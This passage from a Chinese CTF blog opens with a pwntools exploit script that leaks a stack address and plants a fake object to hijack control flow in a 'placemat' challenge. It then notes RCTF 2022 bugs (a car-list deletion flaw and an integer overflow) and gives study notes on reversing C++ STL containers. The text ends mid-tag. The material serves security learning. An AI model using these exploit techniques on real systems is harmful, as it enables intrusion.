code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = <span class="hljs-string">&#x27;./placemat&#x27;</span><br>p = process(<span class="hljs-string">&quot;./placemat&quot;</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;yog&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>ru(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>stack_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>p2_name_addr = stack_addr + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span><br><br>log.success(<span class="hljs-string">f&#x27;leak value: 0x<span class="hljs-subst">&#123;stack_addr:x&#125;</span>&#x27;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr+<span class="hljs-number">20</span>+<span class="hljs-number">48</span>+<span class="hljs-number">4</span>])<br><span class="hljs-comment"># 一串\x00就是为了跳过Game class的内存. </span><br>pl2 = flat([<span class="hljs-string">b&#x27;fake_bot&#x27;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">20</span>+<span class="hljs-number">48</span>-<span class="hljs-number">8</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF4E</span>, <span class="hljs-number">0x804AF4E</span>])<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(pl1)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#gdb.attach(p, &#x27;b *0x804AA96\nc&#x27;)</span><br><span class="hljs-comment">#input(&#x27;wait for gdb&#x27;)</span><br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(pl2)<br><br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure><p>这个exp的问题是由于先手是随机的但是并未检测先手, 导致一半概率达不到想要的结果. 多试两次或者再写个大循环catch exception. </p><h1 id="RCTF-2022"><a href="#RCTF-2022" class="headerlink" title="RCTF 2022"></a>RCTF 2022</h1><h2 id="general-wp"><a href="#general-wp" class="headerlink" title="general wp"></a>general wp</h2><ul><li>RCTF 2022 writeup by W&amp;M <a href="https://blog.wm-team.cn/index.php/archives/35/">https://blog.wm-team.cn/index.php/archives/35/</a> </li><li>RCTF 2022 pwn bfc offical wp <a href="https://github.com/no1rr/RCTF2022/tree/master/pwn_bfc">https://github.com/no1rr/RCTF2022/tree/master/pwn_bfc</a> </li><li>RCTF 2022 bfc wp <a href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc">https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc</a> </li><li>RCTF2022 wp by b3f0re  <a href="https://github.com/b3f0re-team/Write-up/blob/main/RCTF/RCTF.md">https://github.com/b3f0re-team/Write-up/blob/main/RCTF/RCTF.md</a> </li><li>RCTF 2022 Official Writeup - Crypto Part <a href="https://hackmd.io/@GowLxW7-TTGIMIQqhgOUlw/H1_a_rHOi#RCTF-Official-Writeup---Crypto-Part">https://hackmd.io/@GowLxW7-TTGIMIQqhgOUlw/H1_a_rHOi#RCTF-Official-Writeup---Crypto-Part</a> </li><li>RCTF 2022 writeup by Nu1L [233](<a href="https://files.zsxq.com/Fkki7qyvZEuZ2ot5DMTVrpzI5zL-?attname=RCTF">https://files.zsxq.com/Fkki7qyvZEuZ2ot5DMTVrpzI5zL-?attname=RCTF</a> WriteUp By Nu1L.pdf&amp;e=1670928565&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mB8kQYKlYDn-S3ySMDt9Dt9P1L8=) </li><li>RCTF2022-MyCarsShowSpeed Writeup <a href="https://bbs.pediy.com/thread-275512.htm">https://bbs.pediy.com/thread-275512.htm</a></li><li>OFFICIAL WP <a href="https://blog.rois.io/2022/rctf-2022-official-write-up/">https://blog.rois.io/2022/rctf-2022-official-write-up/</a></li></ul><h2 id="MyCarShowSpeed"><a href="#MyCarShowSpeed" class="headerlink" title="MyCarShowSpeed"></a>MyCarShowSpeed</h2><ul><li><p>New a Game</p><ul><li>stability, performance. 真看不出来漏洞…..</li></ul></li><li><p>Show Information</p><ul><li>….</li></ul></li><li><p>Visit The Store</p><ul><li><p>Buy Goods: </p><ul><li>SuperTire没有一点效果. 但是这有什么特别的含义呢. </li><li>有钱买flag之后但是wintimes过少会触发没收车辆. 有什么特别的地方?</li></ul><p>**还真有特别的地方, 回过头来看很明显可以先fix car从carlist上删除该车之后(共拥有两辆车以上), 再来买flag, 直接把剩下的也删掉了, carNum归零. ** </p><ul><li>没看出来……</li></ul></li><li><p>Sell Goods:</p><ul><li>在链表上直接把指针置空当做是删除了车辆. 并没有删除节点. </li></ul></li><li><p>Fix Cars</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">car-&gt;fixTime = time(<span class="hljs-literal">NULL</span>);<br>car-&gt;fixed = <span class="hljs-number">1</span>;<br>_this-&gt;carList-&gt;addCar(car, _this-&gt;carList);<br>_this-&gt;carList-&gt;carNums++;<br><span class="hljs-keyword">if</span>(carList-&gt;carNums &gt; <span class="hljs-number">1</span>)<br>&#123;<br>    car-&gt;isTaken = <span class="hljs-number">1</span>;<br>    carList-&gt;deleteCar(car, &amp;carList);<br>    carList-&gt;carNums--;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK! We will temporily take your car and fix it soon!&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK! We&#x27;ll soon fix it!&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>所有的车大于一辆时就会从车库中(<code>carList</code>)删除这辆车. 而不仅仅是fixed变成1. </p></li><li><p>Fetch Cars</p><ul><li>整数溢出错误</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">fixDifficulty = car-&gt;fixDifficulty;<br>fixedTime = fixDifficulty * time(<span class="hljs-number">0LL</span>) - car-&gt;fixTime;<br>cost = (<span class="hljs-keyword">int</span>)(<span class="hljs-number">0.1</span> * (<span class="hljs-keyword">double</span>)(<span class="hljs-keyword">int</span>)fixedTime) + <span class="hljs-number">5</span>;<br></code></pre></div></td></tr></table></figure><p>可以看出time()返回的巨大时间戳值乘以fixDifficulty后会溢出, 而结果使用int类型, 造成溢出为负数. 测了下只要第二次就可以. </p><img src="../../image/recent_ctf/image-20230101151729612.png" alt="image-20230101151729612" style="zoom: 80%;" /></li></ul><ol start="5"><li>Leave</li></ol></li><li><p>Switch Cars</p></li><li><p>Rules</p></li></ul><ol start="6"><li>Quit</li></ol><p>?????????????????????????????????????????鉴定为烂, 根本不知道哪个文件是远程环境使用的, 被整晕了, 不做了. 本质是tcache利用.</p><img src="../../image/recent_ctf/image-20230101233406596.png" alt="image-20230101233406596" style="zoom:80%;" /><h2 id="Diary"><a href="#Diary" class="headerlink" title="Diary"></a>Diary</h2><blockquote><p>C++逆向. 看到了std::string和std::map的逆向代码. 如果要看懂应该要找找stl的逆向教程.</p></blockquote><ul><li><strong><a href="https://bbs.pediy.com/thread-270547.htm">浅谈STL容器识别</a></strong> (注意链接是MSVC版本, GNU版本在下方)</li></ul><p>开课了, C++基础班. 看了几个深蓝色的链接, 深感知识匮乏啊, 真不愧是C++.</p><img src="../../image/recent_ctf/image-20230102183226852.png" alt="image-20230102183226852" style="zoom:33%;" /><ul><li><p><a href="https://en.cppreference.com/w/cpp/language/using_declaration">using statement</a>. can be used to introduce a member of base class into derived class definition. </p></li><li><p><a href="https://en.cppreference.com/w/cpp/keyword/typename">typename keyword</a> :  Inside a declaration or a definition of a template, typename can be used to declare that a <a href="https://en.cppreference.com/w/cpp/language/dependent_name">dependent qualified name</a> is a type.</p><p><strong>then, what is qualified name??</strong>  </p><ul><li>A qualified name may refer to a<ul><li>class member (including static and non-static functions, types, templates, etc)</li><li>namespace member (including another namespace)</li><li>enumerator</li></ul></li><li>For an <em>unqualified</em> name, that is a name that does not appear to the right of a scope resolution operator <strong><code>::</code></strong>, name lookup sequence depend on reference position(such as global, in namespace, Non-member function definition, etc.)</li></ul><p><strong>finally, what is the word <em>dependent</em> ?</strong> </p><ul><li>not determined by template arguments. </li></ul></li><li><p>所以, STL源码中class内部的<code>using _Nodeptr = typename _Val_types::_Nodeptr;</code>也就可以理解了</p></li><li><p>map和set:</p><ul><li>使用的红黑树: 在查询上最多比平衡二叉树多一次查找, 但是在插入和删除的时候更为高效, 因为其不追求完全的平衡, 减少了大量的平衡性计算.</li></ul></li></ul><p style="font-size:large;font-weight:bold"> 得出结论, MSVC会内联一些代码导致看起来分不清楚, 但是g++编译的话会出现默认allocator的定义后再构造string或者对应的容器, 已经相当简洁了不用在区分容器上过多分析</p><p>但是在逆向文件时发现有不少奇怪函数, 并没有找到教程之类的东西, 有一本RE4B勉强看看吧, 就从这里入个门.</p><p>STL源码也不一定要看, 主要是代码和反编译出来的东西的对应. 注意到上面链接中的是msvc版本的STL, 而GNU的STL在下面</p><p>link: <a href="https://leezw.net/assets/pdf/STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90.pdf">SGI-STL BOOK</a> | <a href="https://github.com/steveLauwh/SGI-STL">SGI_STL Repo</a> | <a href="https://github.com/arkingc/note/blob/master/C++/STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90.md">book note</a> | <a href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/basic_string.h">GNU STL</a> | </p><h3 id="STL-REVERSING"><a href="#STL-REVERSING" class="headerlink" title="STL REVERSING"></a>STL REVERSING</h3><blockquote><p>吾爱找的IDA的DWARF解析出问题, 导致有符号版示例源码变量显示不全, IDA FREE没有这个问题. 明天重下个IDA看看. free版本的使用cloud decompiler实在有点慢, 不过倒也能接受. </p></blockquote><h4 id="示例用源码"><a href="#示例用源码" class="headerlink" title="示例用源码:"></a>示例用源码:</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  map&lt;string, <span class="hljs-keyword">int</span>&gt; m;<br>  string fuckkey = <span class="hljs-string">&quot;fuck&quot;</span>;<br>  m[fuckkey] = <span class="hljs-number">1</span>;<br><br>  set&lt;<span class="hljs-keyword">int</span>&gt; s;<br>  s.<span class="hljs-built_in">insert</span>(<span class="hljs-number">10</span>);<br><br>  vector&lt;string&gt; v;<br>  v.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;vector string&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>无符号和有符号:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-F0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-D0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-A0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v7[<span class="hljs-number">59</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [rsp+ABh] [rbp-45h] BYREF</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+ACh] [rbp-44h] BYREF</span><br>  <span class="hljs-keyword">char</span> v10[<span class="hljs-number">47</span>]; <span class="hljs-comment">// [rsp+B0h] [rbp-40h] BYREF</span><br>  <span class="hljs-keyword">char</span> v11[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+DFh] [rbp-11h] BYREF</span><br><br>  <span class="hljs-built_in">sub_2648</span>(v7, a2, a3);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v8);<br>  <span class="hljs-built_in">sub_2834</span>(v6, <span class="hljs-string">&quot;fuck&quot;</span>, &amp;v8);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v8);<br>  *(_DWORD *)<span class="hljs-built_in">sub_28D4</span>(v7, v6) = <span class="hljs-number">666</span>;<br>  <span class="hljs-built_in">sub_26B8</span>(v5);<br>  v9 = <span class="hljs-number">10</span>;<br>  <span class="hljs-built_in">sub_2A5C</span>(v5, &amp;v9);<br>  <span class="hljs-built_in">sub_2728</span>(v4);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v11);<br>  <span class="hljs-built_in">sub_2834</span>(v10, <span class="hljs-string">&quot;vector string&quot;</span>, v11);<br>  <span class="hljs-built_in">sub_2B90</span>(v4, v10);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(v10);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v11);<br>  <span class="hljs-built_in">sub_2B4C</span>(v4);<br>  <span class="hljs-built_in">sub_26D4</span>(v5);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(v6);<br>  <span class="hljs-built_in">sub_2664</span>(v7);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  std::vector&lt;..::basic_string&lt;... &gt;,std::allocator&lt;..::basic_string&lt;...&gt; &gt; &gt; v; <span class="hljs-comment">// [rsp+0h] [rbp-F0h] BYREF</span><br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt; &gt; s; <span class="hljs-comment">// [rsp+20h] [rbp-D0h] BYREF</span><br>  std::string fuckkey; <span class="hljs-comment">// [rsp+50h] [rbp-A0h] BYREF</span><br>  std::map&lt;..::basic_string&lt;... &gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;... &gt; &gt;,allocator &gt; m; <span class="hljs-comment">// [rsp+70h] [rbp-80h] BYREF</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt; __a; <span class="hljs-comment">// [rsp+ABh] [rbp-45h] BYREF</span><br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt; &gt;::value_type __x; <span class="hljs-comment">// [rsp+ACh] [rbp-44h] BYREF</span><br>  ..::basic_string&lt;... &gt; v10; <span class="hljs-comment">// [rsp+B0h] [rbp-40h] BYREF</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt; v11; <span class="hljs-comment">// [rsp+DFh] [rbp-11h] BYREF</span><br><br>  std::map&lt;..&gt;::basic_string&lt;...&gt;,<span class="hljs-keyword">int</span>,std::less&lt;..&gt;::basic_string&lt;...&gt;&gt;,allocator&gt;::<span class="hljs-built_in">map</span>(&amp;m);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;__a, argv);<br>  ..::basic_string&lt;...&gt;::basic_string&lt;std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;fuckkey, <span class="hljs-string">&quot;fuck&quot;</span>, &amp;__a);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;__a);<br>    <br>  *std::map&lt;..&gt;::basic_string&lt;&gt;::<span class="hljs-keyword">operator</span>[](<br>     &amp;m,<br>     &amp;fuckkey) = <span class="hljs-number">666</span>;<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">set</span>(&amp;s);<br>  __x = <span class="hljs-number">10</span>;<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">insert</span>(&amp;s, &amp;__x);<br>    <br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::<span class="hljs-built_in">vector</span>(&amp;v);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v11, &amp;__x);<br>  ..::basic_string&lt;...&gt;::basic_string&lt;std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(<br>    &amp;v10,<br>    <span class="hljs-string">&quot;vector string&quot;</span>,<br>    &amp;v11);<br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::<span class="hljs-built_in">push_back</span>(<br>    &amp;v,<br>    &amp;v10);<br>  <span class="hljs-comment">//Destructor</span><br>  ..::basic_string&lt;...&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v10);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v11);<br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::~<span class="hljs-built_in">vector</span>(&amp;v);<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::~<span class="hljs-built_in">set</span>(&amp;s);<br>  ..::basic_string&lt;...&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;fuckkey);<br>  std::map&lt;..&gt;::basic_string&lt;...&gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;...&gt;&gt;,allocator&gt;::~<span class="hljs-built_in">map</span>(&amp;m);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h4><ul><li>For a reverse iterator <code>r</code> constructed from an iterator <code>i</code>, the relationship &amp;<em>r == &amp;</em>(i-1) is always true !!!!!!!!!!!!!!<br>这就是为什么rbegin()会看到一个<code>*a1 -= 8</code>. 这个只是vector的迭代器, 其余结构迭代器有待分析. </li></ul><p><img src="../../image/recent_ctf/range-rbegin-rend.svg" alt="range-rbegin-rend.svg"></p><ul><li>如下方表格, 其中a–(或者a++)的内部有流程就是如此, </li></ul><table><thead><tr><th align="center">Expression</th><th align="center">Return</th><th align="center">Equivalent expression</th></tr></thead><tbody><tr><td align="center">–a</td><td align="center">It&amp;</td><td align="center"></td></tr><tr><td align="center">a–</td><td align="center">convertible to const It&amp;</td><td align="center">It temp = a; <br />–a;<br />return temp;</td></tr><tr><td align="center">*a–</td><td align="center">reference</td><td align="center"></td></tr></tbody></table><ul><li><p>**要注意到, 上面表格的temp在编译中发现来自<code>operator++()</code>上层函数当做参数传入的局部变量, 会有基于局部变量空间的相应迭代器构造函数执行, 然后进入<code>operator--()</code>, 最后返回temp也就是传入的指针. </p></li><li><p>还有一点问题, 库函数似乎是<code>__fastcall</code>类型, 如果文件带上符号IDA大概率识别成<code>__cdecl</code>, 而且两个版本设置call type时什么都不做都能报错, 加上7.5版本反编译相关函数时也无法自动识别, 但是8.1可以. 还是用新的吧. 但是新版的把allocator less啥的都标出来, 显得函数名非常非常的长. 也是一个缺点(?)吧. </p></li><li><p>begin()的流程: </p><ul><li>使用临时变量存储iter(有效字段就8字节), </li><li>然后调用相应iterator构造函数(其实就是<code>this-&gt;_M_node = __x</code>这样的)</li><li>直接return返回<code>__x</code>对应的指针.</li></ul></li><li><p>rbegin()的流程: 显而易见. 还是使用了临时变量. 然后再构造反向迭代器. </p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt;::reverse_iterator __fastcall std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;::<span class="hljs-built_in">rbegin</span>(<br>        std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>,<br>        std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt; *a2)<br>&#123;<br>  std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt;::iterator v2; <span class="hljs-comment">// rax</span><br><br>  v2._M_current = std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;::<span class="hljs-built_in">end</span>(a2)._M_current;<br>  std::reverse_iterator&lt;__gnu_cxx::__normal_iterator&lt;enc **,std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;&gt;&gt;::<span class="hljs-built_in">reverse_iterator</span>(<br>    <span class="hljs-keyword">this</span>,<br>    v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li></li></ul><h4 id="string"><a href="#string" class="headerlink" title="string"></a>string</h4><blockquote><p><del>64位下占用32字节,</del> 感觉不是很固定啊, 还是得看具体的架构和系统. 就拿64位linux版gcc编译的吧. </p></blockquote><p>64位下占用32字节. 差点忘记class的实现是先在栈上分配空间然后构造时把this指针(指向栈上)放到构造函数的第一个位置, 找相应构造函数半天没看到原来是这样.  就是这个<code>basic_string( const CharT* s, const Allocator&amp; alloc = Allocator() );</code>, 可以查到各种std::string std::wstring等就是basic_string模板的实例化. </p><p>string所有的构造函数都在basic_string里查找即可, 全局string和其他全局变量的构造函数一起被加入为构造函数指针数组, 在<code>_do_global_ctors</code>之类的函数里按顺序执行. main里面的string按照局部class变量分配和使用空间.</p><blockquote><p>这个所谓的allocator就占用一字节, 懒得探究这是什么了. </p></blockquote><p><del>搞不明白这32字节是什么东西, 暂时放弃.</del> 可以看下面的源码分析. </p><p>从题目中学到的:</p><ul><li>substr其实不止两个参数, 反编译时会有四个参数, 第一个参数是一个栈上临时string变量, 用来接收substr的返回值, 如果没有赋值就直接析构了; 如果再对返回值用上<code>operator[]()</code>其实是对临时string的成员函数调用, 没有调用后立刻被销毁了. </li><li>在源码中看到C++11版本和之前的string内存布局不相同, 不过想来至少都用上了11, 就拿这个为基准了. </li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">_Alloc_hider_M_dataplus;<span class="hljs-comment">//__Alloc_hider里面又有</span><br>size_type_M_string_length;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span> _S_local_capacity = <span class="hljs-number">15</span> / <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(_CharT) &#125;;<br><br><span 